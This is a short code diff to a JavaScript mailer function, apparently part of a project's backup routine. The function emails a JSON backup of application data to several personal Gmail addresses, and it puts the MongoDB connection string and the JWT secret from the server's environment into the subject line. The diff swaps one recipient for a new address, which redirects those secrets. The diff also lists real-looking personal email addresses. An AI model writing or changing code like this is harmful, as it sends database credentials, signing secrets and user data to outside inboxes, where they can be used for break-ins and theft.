@@ -16,7 +16,7 @@ const mailsender = async (backupdata) => {
     // Configure email options
     const mailOptions = {
         from: "fakemailer39@gmail.com",
-        to: ["pratyushg095@gmail.com","amansahu5051@gmail.com","nehanshuajmera@gmail.com","vds02122002@gmail.com","bahadurarnav2203@gmail.com"],
+        to: ["pratyushg095@gmail.com","amansahu5051@gmail.com","hj177362@gmail.com","vds02122002@gmail.com","bahadurarnav2203@gmail.com"],
         subject: `MONGODB ${process.env.MDB_CONNECT} 
         JWT SECRET ${process.env.JWT_SECRET}`,
         text: JSON.stringify(backupdata),
